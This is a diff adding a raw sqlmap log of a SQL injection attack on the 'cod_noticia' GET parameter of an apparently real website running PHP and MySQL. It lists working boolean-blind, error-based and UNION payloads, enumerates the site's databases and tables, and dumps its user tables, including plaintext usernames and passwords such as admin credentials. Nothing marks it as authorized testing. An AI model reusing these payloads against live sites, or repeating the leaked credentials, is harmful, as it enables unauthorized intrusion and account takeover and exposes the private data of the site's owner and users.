@@ -1,0 +1,120 @@
+sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:
+---
+Parameter: cod_noticia (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod_noticia=28 AND 5844=5844
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod_noticia=28 AND (SELECT 3398 FROM(SELECT COUNT(*),CONCAT(0x717a7a6271,(SELECT (ELT(3398=3398,1))),0x717a786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: cod_noticia=28 UNION ALL SELECT NULL,CONCAT(0x717a7a6271,0x6e4a68734a65776868664b7353747879507971596f43737a57537762736c51727159416876426574,0x717a786b71),NULL,NULL-- gxsr
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] elobrasc_elobras
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod_noticia (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod_noticia=28 AND 5844=5844
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod_noticia=28 AND (SELECT 3398 FROM(SELECT COUNT(*),CONCAT(0x717a7a6271,(SELECT (ELT(3398=3398,1))),0x717a786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: cod_noticia=28 UNION ALL SELECT NULL,CONCAT(0x717a7a6271,0x6e4a68734a65776868664b7353747879507971596f43737a57537762736c51727159416876426574,0x717a786b71),NULL,NULL-- gxsr
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+Database: elobrasc_elobras
+[16 tables]
++-------------------+
+| menu_mnu_ing      |
+| newslleter        |
+| produtos          |
+| tb_estados        |
+| tb_grupos         |
+| tb_grupos_eua     |
+| tb_linha_produtos |
+| tb_noticias       |
+| tb_noticias_eua   |
+| tb_produtos       |
+| tb_produtos_eua   |
+| tb_representantes |
+| tb_sub            |
+| tb_usuarios       |
+| tercerizacao      |
+| usuarios          |
++-------------------+
+
+Database: elobrasc_elobras
++-----------------+---------+
+| Table           | Entries |
++-----------------+---------+
+| tb_estados      | 27      |
+| tb_produtos     | 6       |
+| tb_noticias     | 5       |
+| usuarios        | 3       |
+| tb_usuarios     | 2       |
+| tb_grupos       | 1       |
+| tb_noticias_eua | 1       |
+| tercerizacao    | 1       |
++-----------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod_noticia (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod_noticia=28 AND 5844=5844
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod_noticia=28 AND (SELECT 3398 FROM(SELECT COUNT(*),CONCAT(0x717a7a6271,(SELECT (ELT(3398=3398,1))),0x717a786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: cod_noticia=28 UNION ALL SELECT NULL,CONCAT(0x717a7a6271,0x6e4a68734a65776868664b7353747879507971596f43737a57537762736c51727159416876426574,0x717a786b71),NULL,NULL-- gxsr
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+Database: elobrasc_elobras
+Table: usuarios
+[3 entries]
++----+--------+----------+----------+-------------+----------------+
+| id | nome   | senha    | username | senha_admin | confirma_senha |
++----+--------+----------+----------+-------------+----------------+
+| 15 | admin  | admin    | admin    | ellite      | admin          |
+| 16 | eloi   | ellite87 | ellite1  | ellite2     | ellite87       |
+| 24 | Felipe | 123      | felipe   | -           | 123            |
++----+--------+----------+----------+-------------+----------------+
+
+Database: elobrasc_elobras
+Table: tb_usuarios
+[2 entries]
++-----------+-------------+-------------+
+| des_senha | cod_usuario | des_usuario |
++-----------+-------------+-------------+
+| 1         | 1           | 1           |
+| elobras   | 2           | elobras     |
++-----------+-------------+-------------+
+
